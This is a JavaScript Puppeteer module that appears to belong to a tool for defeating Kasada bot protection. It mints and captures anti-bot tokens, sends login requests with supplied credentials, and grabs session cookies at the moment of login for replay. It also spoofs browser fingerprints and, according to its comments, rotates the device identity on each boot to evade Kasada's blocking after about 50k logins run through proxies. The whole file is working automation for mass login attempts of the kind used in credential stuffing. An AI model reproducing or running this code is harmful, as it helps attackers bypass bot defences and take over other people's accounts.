import { PJS_RE, MFC_RE, TL_RE, FP_RE, proxyServerUrl } from './lib.mjs';
import { resolveTarget, endpointReFor } from './targets.mjs';

// The new p.js (j-1.2.797+) mints the real ct via a /tl POST it fires during load. A /tl that
// returns 200 but carries NO x-kpsdk-ct is NOT a mint (isReady can be true while the ct is absent);
// a login then gets a bare 429. Exported so the fullPage mint-wait and tests share one definition.
export function tlMinted(tlArr) {
  return (tlArr || []).some((t) => t && t.status === 200 && t.hasCt);
}

// restore a minimized window to NORMAL but park it fully off-screen: minimized
// windows drop renderer input (CDP clicks silently ignored) - clicks need a real
// surface; off-screen keeps it invisible without stealing visible screen space.
export async function restoreWindowOffscreen(page) {
  let session;
  try {
    session = await page.target().createCDPSession();
    const { targetInfo } = await session.send('Target.getTargetInfo');
    const { windowId } = await session.send('Browser.getWindowForTarget', { targetId: targetInfo.targetId });
    // TWO separate calls: mixing windowState + position in one setWindowBounds applies
    // only the state on many builds -> the window stayed MAXIMIZED and visible.
    await session.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'normal' } }).catch(() => {});
    await session.send('Browser.setWindowBounds', { windowId, bounds: { left: -28000, top: 0, width: 520, height: 400 } }).catch(() => {});
    // small window is enough: clicks map to the Emulation viewport (1280x800), not
    // the physical window - lighter to composite, invisible if the OS clamps
  } catch { /* cosmetic only */ }
  finally { if (session) await session.detach().catch(() => {}); }
}

export async function minimizeWindow(page) {
  let session;
  try {
    session = await page.target().createCDPSession();
    const { targetInfo } = await session.send('Target.getTargetInfo');
    const { windowId } = await session.send('Browser.getWindowForTarget', { targetId: targetInfo.targetId });
    await session.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'minimized' } });
  } catch { /* cosmetic only */ }
  finally { if (session) await session.detach().catch(() => {}); }
}

const _HTML_CACHE = new Map();


export function pickHtml(variant = 'pure', pjsUrl) {
  if (!pjsUrl) {
    throw new Error('pickHtml: pjsUrl required (target has no Kasada script URL - auto-detect it first)');
  }
  const key = `${variant}|${pjsUrl}`;
  const cached = _HTML_CACHE.get(key);
  if (cached) return cached;
  // EMBED the configure call inline (the real page does this immediately after
  // p.js loads — the new p.js expects this pattern; a bare script tag alone
  // leaves it in an ambiguous state where it won't fire kpsdk-ready).
  const pjsUrlResolved = pjsUrl.startsWith('//') ? 'https:' + pjsUrl : pjsUrl;
  const pjsTag = `<script src="${pjsUrl}"></script><script>window.KPSDK && window.KPSDK.configure([{method:"POST",domain:"${new URL(pjsUrlResolved).hostname}",path:"*"}]);</script>`;
  const html =
    variant === 'skeleton'
      ? `<!doctype html><html><head><meta charset="utf-8"><title>x</title>${pjsTag}</head>
<body>
<form id="signin">
  <input id="username" name="username" autocomplete="username" />
  <input id="password" name="password" type="password" autocomplete="current-password" />
  <button type="submit">Sign In</button>
</form>
</body></html>`
      : `<!doctype html><html><head><meta charset="utf-8"><title>x</title>${pjsTag}</head><body></body></html>`;
  _HTML_CACHE.set(key, html);
  return html;
}

export const LOGIN_SNAPSHOTS = new WeakMap(); // page -> exact-moment login cookie jar (pool wrappers drop custom fr fields)

export async function fireLoginFetch(page, opts = {}) {
  const { user, pass } = opts;
  const target = opts.target || resolveTarget(opts.targetInput || {});
  const host = opts.host || target.endpoint.domain;
  const lpath = opts.lpath || target.endpoint.path;
  const method = String(opts.method || target.endpoint.method || 'POST').toUpperCase();
  const epRe = opts.endpointRe || endpointReFor(target);
  const bodyStr = JSON.stringify(
    opts.loginBodyObj
      ? opts.loginBodyObj
      : target.loginBody
        ? target.loginBody({ user, pass })
        : { username: user, password: pass, remember_me: true }
  );
  const contentType = opts.contentType || 'application/json';
  const extraQuery = opts.loginQuery || ''; // e.g. '?app=email&realm=pass&status=0' - the app-context that makes the login reply with a SIGNED token_transfer redirect (HAR-proven)
  const extraHeaders = opts.extraHeaders || {};
  const t0 = Date.now();
  const captured = {
    kpsdkHeaders: { ct: null, cd: null, h: null, v: null, fc: null },
    mfc: null,
  };

  const onResponse = async (res) => {
    try {
      const url = res.url();
      // the login response = the exact-moment the session cookies exist in the
      // context (they VANISH seconds later - captureAsync's auth_pass flicker).
      // Snapshot the full cookie store right here.
      if (/(\/login|\/pass\/|\/session|\/auth)/i.test(url) && res.status() === 200 && !captured.loginMomentCookies) {
        try {
          captured.loginMomentCookies = await page.cookies();
          LOGIN_SNAPSHOTS.set(page, captured.loginMomentCookies);
          if (process.env.INBOX_DEBUG === '1') console.error('[inbox] moment snapshot: ' + captured.loginMomentCookies.length + ' cookies @ ' + url.slice(0, 70));
        } catch (e) {
          if (process.env.INBOX_DEBUG === '1') console.error('[inbox] moment snapshot FAILED: ' + String(e && e.message || e).slice(0, 80));
        }
      }
      if (MFC_RE.test(url)) {
        const h = res.headers();
        const fc = h['x-kpsdk-fc'] || null;
        const hVal = h['x-kpsdk-h'] || null;
        if (fc) captured.kpsdkHeaders.fc = fc;
        if (hVal) captured.kpsdkHeaders.h = hVal;
        let body = '';
        try { body = await res.text(); } catch {}
        captured.mfc = { status: res.status(), fc, h: hVal, body: body.slice(0, 500) };
      }
      if (TL_RE.test(url)) {
        const h = res.headers();
        const ct = h['x-kpsdk-ct'] || null;
        if (ct) captured.kpsdkHeaders.ct = ct;
      }
    } catch {}
  };
  const onRequest = (req) => {
    try {
      if (epRe.test(req.url()) && req.method() === method) {
        const h = req.headers();
        if (h['x-kpsdk-ct']) captured.kpsdkHeaders.ct = h['x-kpsdk-ct'];
        if (h['x-kpsdk-cd']) captured.kpsdkHeaders.cd = h['x-kpsdk-cd'];
        if (h['x-kpsdk-h']) captured.kpsdkHeaders.h = h['x-kpsdk-h'];
        if (h['x-kpsdk-v']) captured.kpsdkHeaders.v = h['x-kpsdk-v'];
      }
    } catch {}
  };
  page.on('response', onResponse);
  page.on('request', onRequest);

  // Set-Cookie lives in CDP responseReceivedExtraInfo (plain response headers lack
  // it) - collect every set-cookie during the login window; the session cookies the
  // mail federation needs are among them and they vanish from the tab later.
  let _xtraCdp = null;
  const _extraCookies = [];
  try {
    _xtraCdp = await page.target().createCDPSession();
    _xtraCdp.on('Network.responseReceivedExtraInfo', (ev) => {
      try {
        const h = ev.headers || {};
        const sc = h['Set-Cookie'] || h['set-cookie'];
        if (sc) _extraCookies.push(...(Array.isArray(sc) ? sc : [sc]));
      } catch {}
    });
    await _xtraCdp.send('Network.enable').catch(() => {});
  } catch {}

  try {
    const result = await page.evaluate(
      async ({ host, lpath, extraQuery, method, bodyStr, contentType, extraHeaders, traceparent }) => {
        try {
          let tp = null;
          if (traceparent) {
            const hex = (n) => [...crypto.getRandomValues(new Uint8Array(n))].map((b) => b.toString(16).padStart(2, '0')).join('');
            tp = `00-${hex(16)}-${hex(8)}-01`;
          }
          const res = await fetch(`https://${host}${lpath}${extraQuery || ''}`, {
            method,
            credentials: 'include',
            headers: { 'content-type': contentType, accept: 'application/json', ...(tp ? { traceparent: tp } : {}), ...extraHeaders },
            body: bodyStr,
          });
          const body = await res.text();
          // Cap high (not 400) so the capture path can JSON.parse the FULL login reply
          // (a >400ch redirect_url used to truncate -> capture silently died). classify() only reads the start.
          return { ok: true, status: res.status, body: body.slice(0, 8192) };
        } catch (e) {
          return { ok: false, err: String(e?.message || e) };
        }
      },
      { host, lpath, extraQuery, method, bodyStr, contentType, extraHeaders, traceparent: !!opts.traceparent }
    );
    if (!result.ok) return { error: new Error(result.err), ms: Date.now() - t0, ...captured };
    return { status: result.status, body: result.body, ms: Date.now() - t0, ...captured };
  } catch (e) {
    return { error: e, ms: Date.now() - t0, ...captured };
  } finally {
    page.off('response', onResponse);
    page.off('request', onRequest);
    try { await _xtraCdp?.detach(); } catch {}
    if (_extraCookies.length) captured.setCookies = _extraCookies.filter((c) => typeof c === 'string' && c.includes('='));
  }
}

export async function mintTokens(page, opts = {}) {
  const target = opts.target || resolveTarget(opts.targetInput || {});
  const host = target.endpoint.domain;
  const lpath = target.endpoint.path;
  const method = String(target.endpoint.method || 'POST').toUpperCase();
  const protocol = target.endpoint.protocol || 'https:';
  const timeoutMs = Math.max(2000, opts.timeoutMs || 10_000);
  const triggerBody = JSON.stringify(
    target.loginBody ? target.loginBody({ user: opts.user || 'x@y.com', pass: opts.pass || 'x' }) : {}
  );
  const t0 = Date.now();

  const cdp = await page.target().createCDPSession();
  let captured = null;
  let resolveCap;
  const capPromise = new Promise((r) => (resolveCap = r));
  const pick = (hdrs, name) => {
    for (const k of Object.keys(hdrs || {})) if (k.toLowerCase() === name) return hdrs[k];
    return null;
  };
  const onPaused = async (ev) => {
    try {
      const h = ev.request.headers || {};
      captured = {
        ct: pick(h, 'x-kpsdk-ct'),
        cd: pick(h, 'x-kpsdk-cd'),
        h: pick(h, 'x-kpsdk-h'),
        v: pick(h, 'x-kpsdk-v'),
      };
      await cdp.send('Fetch.failRequest', { requestId: ev.requestId, errorReason: 'Aborted' }).catch(() => {});
    } catch {}
    resolveCap();
  };
  cdp.on('Fetch.requestPaused', onPaused);

  try {
    await cdp.send('Fetch.enable', {
      patterns: [{ urlPattern: `*${lpath}*`, requestStage: 'Request' }],
    });

    const url = `${protocol}//${host}${lpath}`;
    page
      .evaluate(
        async ({ url, method, triggerBody }) => {
          try {
            await fetch(url, {
              method,
              credentials: 'include',
              headers: { 'content-type': 'application/json', accept: 'application/json' },
              body: triggerBody,
            });
          } catch {}
        },
        { url, method, triggerBody }
      )
      .catch(() => {});

    await Promise.race([capPromise, new Promise((r) => setTimeout(r, timeoutMs))]);

    if (!captured?.cd) {
      return { ok: false, error: 'failed to capture x-kpsdk-cd (page not armed/configured for this endpoint?)', ms: Date.now() - t0 };
    }

    let userAgent = null;
    let cookies = [];
    let egressIp = null;
    try { userAgent = await page.evaluate(() => navigator.userAgent); } catch {}
    try { cookies = await page.cookies(`${protocol}//${host}`); } catch {}
    if (opts.egressIp) {
      // the mint tab's exit IP through ITS line - the checker compares this to its own
      // replay-side echo; a mismatch = rotating line = guaranteed EMPTY_200 on replay
      // BEST-EFFORT ONLY: a hung ipify must NOT block the mint. Without a bound, page.evaluate waits
      // up to the 180s CDP protocolTimeout, the caller's withTimeout then fires, and an ALREADY-MINTED
      // ct/cd is thrown away as TOKEN_FAIL. Race it to 3s and treat failure as egressIp:null.
      try {
        egressIp = await Promise.race([
          page.evaluate(async () => {
            try { const r = await fetch('https://api64.ipify.org?format=json', { cache: 'no-store', signal: AbortSignal.timeout(2500) }); return (await r.json()).ip; }
            catch { return null; }
          }).catch(() => null), // if the page tears down after the 3s timer already won, swallow the late rejection (no unhandledRejection)
          new Promise((r) => { const t = setTimeout(() => r(null), 3000); t.unref?.(); }),
        ]);
      } catch { egressIp = null; }
    }
    const cookieHeader = cookies.map((c) => `${c.name}=${c.value}`).join('; ');

    return {
      ok: true,
      ms: Date.now() - t0,
      headers: {
        'x-kpsdk-ct': captured.ct,
        'x-kpsdk-cd': captured.cd,
        'x-kpsdk-h': captured.h,
        'x-kpsdk-v': captured.v,
      },
      cookies: cookies.map((c) => ({ name: c.name, value: c.value, domain: c.domain, path: c.path })),
      cookieHeader,
      userAgent,
      egressIp,
    };
  } catch (e) {
    return { ok: false, error: String(e?.message || e), ms: Date.now() - t0 };
  } finally {
    // disable BEFORE unbinding: if a request pauses in the gap between off() and disable(), no handler
    // is left to continue/fail it and it hangs until detach. Disable first so no new pause fires.
    await cdp.send('Fetch.disable').catch(() => {});
    cdp.off('Fetch.requestPaused', onPaused);
    await cdp.detach().catch(() => {});
  }
}

export async function detectPjsUrl(page, target, opts = {}) {
  const timeoutMs = Math.max(3000, opts.timeoutMs || 20_000);
  let found = null;
  let resolveFound;
  const done = new Promise((r) => (resolveFound = r));
  const onReq = (req) => {
    try {
      const u = req.url();
      if (PJS_RE.test(u) && u.startsWith(target.origin)) {
        found = found || u;
        resolveFound();
      }
    } catch {}
  };
  page.on('request', onReq);
  try {
    page.goto(target.url, { waitUntil: 'domcontentloaded', timeout: timeoutMs }).catch(() => {});
    await Promise.race([done, new Promise((r) => setTimeout(r, timeoutMs))]);
    if (!found) {
      try {
        found = await page.evaluate((origin) => {
          const s = [...document.querySelectorAll('script[src]')]
            .map((x) => x.src)
            .find((src) => /\/p\.js(?:\?|$)/.test(src) && src.indexOf(origin) === 0);
          return s || null;
        }, target.origin);
      } catch {}
    }
  } finally {
    page.off('request', onReq);
    // page.goto was fire-and-forget; stop any still-running navigation so an abandoned load can't bleed into a
    // reused page. Fire-and-forget + swallowed (no added latency; /token discards this context anyway) - defensive
    // hardening for Gemini's abandoned-navigation flag, so detectPjsUrl stays safe even if ever used on a pooled tab.
    page.evaluate(() => window.stop()).catch(() => {});
  }
  return found;
}

export async function runSemiVm(page, opts) {
  const {
    user,
    pass,
    variant = 'pure',
    label = 'semi-vm',
    verbose = false,
    skipLogin = false, // when true: warm + arm + configure, but don't fire login
    fullPage = false,  // when true (or target has no pjsUrl): arm on the REAL page,
    onProgress = () => {}, // fired once per Kasada signal class (pjs|tl|mfc|kpsdk) seen -
  } = opts;

  const target =
    opts.target && opts.target.origin && opts.target.endpoint
      ? opts.target
      : resolveTarget(opts.target || {});
  const epRe = endpointReFor(target);
  const useStub = !fullPage && !!target.pjsUrl;
  let discoveredPjs = null;

  const log = verbose ? (m) => console.log(`  [${label}] ${m}`) : () => {};

  const network = { pjs: [], tl: [], mfc: [], fp: [], login: [] };
  const kpsdkHeaders = { ct: null, fc: null, h: null, cd: null, v: null };
  let pjsBuild = null; // { etag, lastModified } - WHICH p.js build armed this tab (Kasada rebuilds hourly)
  const loginReqHeaders = [];
  const pageLogs = [];
  const navHistory = [];
  const t0 = Date.now();
  let error = null;
  let sdkReady = null;
  let cdp = null; // declared at fn scope so the main try/finally owns its teardown (see below)

  const _seenSignals = new Set();
  const signal = (kind) => {
    if (_seenSignals.has(kind)) return;
    _seenSignals.add(kind);
    try { onProgress(kind); } catch { /* never let a progress callback break the warm */ }
  };

  const onResponse = async (res) => {
    try {
      onProgress('net'); // RAW tick on every response - re-arms the pool's stall watchdog while
      // traffic flows. signal() below is deduped per class, so without this raw tick the stall
      // timer fired 12s after the 4th unique class even when the arm was progressing fine
      // (slow lines were being stall-killed mid-download).
      const url = res.url();
      const status = res.status();
      if (PJS_RE.test(url)) {
        network.pjs.push({ status });
        signal('pjs'); // earliest sign of life - Kasada script is loading
        if (!discoveredPjs && url.startsWith(target.origin)) discoveredPjs = url;
        // build identity: Kasada rebuilds p.js ~hourly (measured 2026-08-29) - record WHICH build
        // armed this tab so /health answers "Kasada changed vs solver regressed" at a glance.
        if (!pjsBuild) {
          const ph = res.headers(); // local lookup - `h` only exists inside the /tl and /mfc branches here
          const etag = ph.etag || null;
          const lastModified = ph['last-modified'] || null;
          if (etag || lastModified) pjsBuild = { etag, lastModified };
        }
      }
      if (TL_RE.test(url)) {
        const h = res.headers();
        const ct = h['x-kpsdk-ct'] || null;
        const st = h['x-kpsdk-st'] || null;
        if (ct) kpsdkHeaders.ct = ct;
        network.tl.push({ status, hasCt: !!ct, ct, st });
        signal('tl');
      }
      if (MFC_RE.test(url)) {
        const h = res.headers();
        const fc = h['x-kpsdk-fc'] || null;
        const hVal = h['x-kpsdk-h'] || null;
        if (fc) kpsdkHeaders.fc = fc;
        if (hVal) kpsdkHeaders.h = hVal;
        let body = '';
        try { body = await res.text(); } catch {}
        network.mfc.push({ status, hasFc: !!fc, hasH: !!hVal, fc, h: hVal, body: body.slice(0, 500) });
        signal('mfc');
      }
      if (FP_RE.test(url)) {
        network.fp.push({ status });
      }
      if (epRe.test(url)) {
        let body = '';
        try { body = await res.text(); } catch {}
        network.login.push({ status, body: body.slice(0, 4096) }); // 4KB not 400: classifyKasada tests /KPSDK={}/ on this body; a challenge marker past 400 chars was mis-read as kasadaSolved=true
      }
    } catch {}
  };
  page.on('response', onResponse);

  const onLoginReq = (req) => {
    try {
      if (epRe.test(req.url()) && req.method() === target.endpoint.method) {
        const h = req.headers();
        const entry = {
          ct: h['x-kpsdk-ct'] || null,
          cd: h['x-kpsdk-cd'] || null,
          h: h['x-kpsdk-h'] || null,
          v: h['x-kpsdk-v'] || null,
        };
        if (entry.ct) kpsdkHeaders.ct = entry.ct;
        if (entry.cd) kpsdkHeaders.cd = entry.cd;
        if (entry.h) kpsdkHeaders.h = entry.h;
        if (entry.v) kpsdkHeaders.v = entry.v;
        loginReqHeaders.push(entry);
      }
    } catch {}
  };
  page.on('request', onLoginReq);

  // NOTE: the Kasada stub is served via CDP Fetch inside the main try{} below (see [arm]),
  // so a createCDPSession/Fetch.enable failure still hits the finally cleanup (was leaking listeners).

  const onConsole = (msg) => {
    const t = msg.type();
    if (t === 'error' || t === 'warning') {
      pageLogs.push(`[console.${t}] ${msg.text().slice(0, 200)}`);
    }
  };
  const onPageError = (err) => {
    pageLogs.push(`[pageerror] ${String(err?.message || err).slice(0, 200)}`);
  };
  const onFrameNav = (frame) => {
    if (frame === page.mainFrame()) {
      navHistory.push({ t: Date.now() - t0, url: frame.url().slice(0, 120) });
    }
  };
  const onDiagReq = (req) => {
    const rt = req.resourceType();
    if (rt === 'xhr' || rt === 'fetch' || rt === 'document') {
      pageLogs.push(`[req.${rt}] ${req.method()} ${req.url().slice(0, 140)}`);
    }
  };
  page.on('console', onConsole);
  page.on('pageerror', onPageError);
  page.on('framenavigated', onFrameNav);
  page.on('request', onDiagReq);

  try {
    // [arm] serve the Kasada p.js stub on the real origin via CDP Fetch. Inside the try so a
    // createCDPSession/Fetch.enable failure still runs the finally cleanup (was a listener leak).
    if (useStub) {
      cdp = await page.target().createCDPSession();
      let docServed = false;
      cdp.on('Fetch.requestPaused', async (event) => {
        try {
          const url = event.request.url;
          if (!docServed && event.resourceType === 'Document' && url.startsWith(target.origin)) {
            docServed = true;
            await cdp.send('Fetch.fulfillRequest', {
              requestId: event.requestId,
              responseCode: 200,
              responseHeaders: [
                { name: 'content-type', value: 'text/html; charset=utf-8' },
                { name: 'cache-control', value: 'no-store' },
              ],
              body: Buffer.from(pickHtml(variant, target.pjsUrl), 'utf8').toString('base64'),
            });
            await cdp.send('Fetch.disable').catch(() => {});
            return;
          }
          await cdp.send('Fetch.continueRequest', { requestId: event.requestId });
        } catch {}
      });
      await cdp.send('Fetch.enable', {
        patterns: [
          { urlPattern: `${target.origin}/*`, resourceType: 'Document', requestStage: 'Request' },
        ],
      });
    }

    const gotoTimeoutMs = opts.gotoTimeoutMs ?? 45_000; // 30s was exceeded by slow resi lines at peak (2026-08-29 eve)
    const kpsdkWaitMs = opts.kpsdkWaitMs ?? 15_000;
    const kpsdkReadyMs = opts.kpsdkReadyMs ?? 20_000;

    log('[1] goto target (serving HTML with baked <script src=p.js>)...');
    await page.goto(target.url, { waitUntil: 'domcontentloaded', timeout: gotoTimeoutMs });

    log('[2] wait for window.KPSDK to appear...');
    const kpsdkAppeared = await page
      .waitForFunction(
        () =>
          typeof window.KPSDK === 'object' &&
          window.KPSDK &&
          typeof window.KPSDK.configure === 'function',
        { timeout: kpsdkWaitMs, polling: 100 }
      )
      .catch(() => null);
    if (kpsdkAppeared) signal('kpsdk');

    log('[3] install kpsdk-ready listener + call KPSDK.configure(...)');
    if (!kpsdkAppeared) {
      // KPSDK never appeared within the wait window: p.js did not load (dead/slow line or 403).
      // Fail with a clean reason instead of letting the configure evaluate throw a TypeError.
      throw new Error(`KPSDK never appeared within ${kpsdkWaitMs}ms (p.js did not load - line too slow or refused)`);
    }
    sdkReady = await page.evaluate(
      ({ host, lpath, kpsdkReadyMs, noConfigure }) =>
        new Promise((resolve) => {
          const messages = [];
          const timer = setTimeout(
            () => resolve({ ok: false, reason: `timeout ${kpsdkReadyMs}ms`, messages }),
            kpsdkReadyMs
          );

          if (!window.KPSDK || typeof window.KPSDK.configure !== 'function') {
            resolve({ ok: false, reason: 'KPSDK not present at configure time', messages });
            return;
          }
          window.addEventListener('message', (ev) => {
            const d = ev?.data;
            if (typeof d === 'string' && d.startsWith('KPSDK:')) {
              messages.push({ data: d.slice(0, 200), origin: ev.origin });
            }
          });

          window.addEventListener(
            'kpsdk-ready',
            () => {
              clearTimeout(timer);
              resolve({ ok: true, source: 'kpsdk-ready event', messages });
            },
            { once: true }
          );

          if (window.KPSDK.isReady && window.KPSDK.isReady()) {
            clearTimeout(timer);
            resolve({ ok: true, source: 'isReady immediate', messages });
            return;
          }

          // THE REAL PAGE calls configure() with GLOB paths + no protocol —
          // our old format (exact path + protocol) was rejected by the new p.js.
          // Also poll isReady() in parallel (auto-arm fallback).
          const poll = setInterval(() => {
            if (window.KPSDK.isReady && window.KPSDK.isReady()) {
              clearInterval(poll);
              clearTimeout(timer);
              resolve({ ok: true, source: 'isReady poll', messages });
            }
          }, 500);
          // call configure() ourselves only on the STUB page. The REAL page calls
          // configure() inline right after its p.js tag; our second call there is
          // dropped (HAR-proven 2026-09-29: the page's own configure arms it).
          if (!noConfigure) {
            try {
              window.KPSDK.configure([
                { method: 'POST', domain: host, path: '*' + lpath + '*' },
              ]);
            } catch (e) {
              messages.push({ data: 'configure threw: ' + String(e?.message || e), origin: 'local' });
            }
          }
        }),
      {
        host: target.endpoint.domain,
        lpath: target.endpoint.path,
        kpsdkReadyMs,
        noConfigure: !useStub,
      }
    );

    if (!sdkReady.ok) {
      throw new Error(
        `KPSDK never armed (variant=${variant}, reason=${sdkReady.reason})`
      );
    }
    log(`[3] KPSDK ready (${sdkReady.source}) - ${sdkReady.messages.length} msg(s)`);

    // The NEW p.js (j-1.2.797+, 2026-09-29) mints the real ct via a /tl POST it
    // fires on its own during load (fp-iframe challenge chain -> tl -> akm_Imprb
    // cookie). A login without that ct gets a bare 429 even when isReady() is
    // true - isReady alone is NOT an arm anymore. Wait for the mint (bounded).
    if (fullPage) {
      const mintWaitMs = opts.mintWaitMs ?? 12_000;
      const deadline = Date.now() + mintWaitMs;
      const minted = () => tlMinted(network.tl);
      while (!minted() && Date.now() < deadline) {
        await new Promise((r) => setTimeout(r, 300));
      }
      log(`[3b] tl mint ${minted() ? 'seen' : 'NOT seen (proceeding anyway)'} @ ${Date.now() - t0}ms`);
    }

    if (skipLogin) {
      log('[4] skipLogin=true - page armed and waiting (for pool reuse)');
    } else {
      log('[4] fire login fetch...');
      const fr = await fireLoginFetch(page, {
        user, pass, target, endpointRe: epRe, loginBodyObj: opts.loginBodyObj,
        loginQuery: opts.loginQuery ?? target.loginQuery ?? '',
        traceparent: opts.traceparent ?? target.traceparent ?? false,
      });
      if (fr.error) {
        throw new Error(`in-page fetch failed: ${fr.error.message || fr.error}`);
      }
      if (!network.login.some((l) => l.status === fr.status && l.body === fr.body)) {
        network.login.push({ status: fr.status, body: fr.body });
      }
    }
  } catch (e) {
    error = e;
  } finally {
    page.off('response', onResponse);
    page.off('request', onLoginReq);
    page.off('console', onConsole);
    page.off('pageerror', onPageError);
    page.off('framenavigated', onFrameNav);
    page.off('request', onDiagReq);
    if (cdp) await cdp.detach().catch(() => {});
  }

  return {
    label,
    network,
    error,
    sdkReady,
    ms: Date.now() - t0,
    navHistory,
    pageLogs,
    kpsdkHeaders,        // raw {ct, cd, h, v, fc} aggregated from responses + login request
    loginReqHeaders,     // each /login POST's outgoing kpsdk-* header set
    pjsUrl: target.pjsUrl || discoveredPjs, // known (stub) or discovered (full-page) Kasada script
    pjsBuild,            // { etag, lastModified } of the p.js build that armed this run
  };
}

export function buildLaunchArgs(proxy, opts = {}) {
  const w = opts.viewportW || 100;
  const h = opts.viewportH || 100;
  const launchArgs = [
    '--no-sandbox',
    '--disable-blink-features=AutomationControlled',
    '--lang=en-US',
    '--disable-dev-shm-usage',
    '--disable-background-timer-throttling',
    '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-sync',
    '--metrics-recording-only',
    '--no-first-run',
    '--no-default-browser-check',
    '--password-store=basic',
    '--use-mock-keychain',
    '--disable-breakpad',
    '--disable-component-extensions-with-background-pages',
    '--disable-ipc-flooding-protection',
    '--mute-audio',
    `--window-size=${w},${h}`,
  ];
  // Software WebGL — MANDATORY on Linux. A GPU-less server reports NO WebGL (Chrome 148 default),
  // which Kasada reads via UNMASKED_RENDERER_WEBGL and soft-blocks ~95% of logins (empty-200).
  // So on Linux it is ALWAYS on (not optional). Off on Windows/mac (real GPU) unless ENABLE_SWIFTSHADER=1.
  // Harmless if a Linux box has a real GPU (Chrome still uses it). Verified VPS 2026-06-02: 5.8%→99%.
  if (process.platform === 'linux' || process.env.ENABLE_SWIFTSHADER === '1') launchArgs.push('--enable-unsafe-swiftshader');
  // fingerprint-chromium native spoof (default browser). Seed activates the canvas/WebGL/font spoof +
  // makes WebGL report a real consistent device. Per-browser seed via opts.fingerprintSeed (multi-browser)
  // or FINGERPRINT_SEED env. No-op on regular Chrome. FINGERPRINT_SEED=0 disables.
  // DEVICE-ROTATION LAW (2026-09-14, the 50k-cliff): the seed IS the device identity
  // (canvas/WebGL/audio/fonts). The old fixed '1000' default meant EVERY deployment
  // worldwide presented the SAME device - Kasada's server-side device clustering
  // flagged it after ~50k cumulative logins and started 400ing/never-arming it:
  // IP changes didn't help (block is device-keyed), restarts didn't help (same
  // seed re-presented), real browsers on the same proxy worked (different device).
  // Default is now RANDOM PER BOOT - every solver restart is a fresh device.
  // Set FINGERPRINT_SEED=<n> to pin (debugging only - do not run volume on a pin).
  const _fpSeed = opts.fingerprintSeed ?? process.env.FINGERPRINT_SEED
    ?? String(100_000_000 + Math.floor(Math.random() * 800_000_000));
  globalThis.__fpDeviceId = String(_fpSeed); // surfaced in boot log + /health (device correlation)
  if (_fpSeed && String(_fpSeed) !== '0') {
    const _fpPlat = process.platform === 'win32' ? 'windows' : (process.platform === 'darwin' ? 'macos' : 'linux');
    launchArgs.push(`--fingerprint=${_fpSeed}`, `--fingerprint-platform=${_fpPlat}`);
  }
  if (opts.userDataDir) {
    launchArgs.push(`--user-data-dir=${opts.userDataDir}`);
  }
  if (proxy) launchArgs.push(`--proxy-server=${proxyServerUrl(proxy)}`);
  if (opts.hidden) {
    launchArgs.push('--window-position=-32000,-32000');
    launchArgs.push('--start-minimized');
  }
  return launchArgs;
}
